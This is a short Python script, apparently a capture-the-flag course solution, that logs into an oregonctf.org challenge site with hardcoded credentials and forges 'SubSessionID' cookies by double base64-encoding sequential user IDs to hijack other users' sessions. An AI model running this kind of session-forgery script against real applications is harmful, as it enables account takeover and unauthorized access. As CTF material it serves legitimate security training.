import requests, sys, base64

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6"

for index in range(0,50):
    s = str(index).zfill(16)

    postData = {"userId":s, "useSecurity":"true"}
    
    cookieValue = str(base64.b64encode(base64.b64encode(s.encode()))).split("'")[1]
    print(cookieValue)
    cookieData = {"SubSessionID":cookieValue}

    response2 = session.post(targetUrl, data=postData, cookies=cookieData)
    print(response2.text)

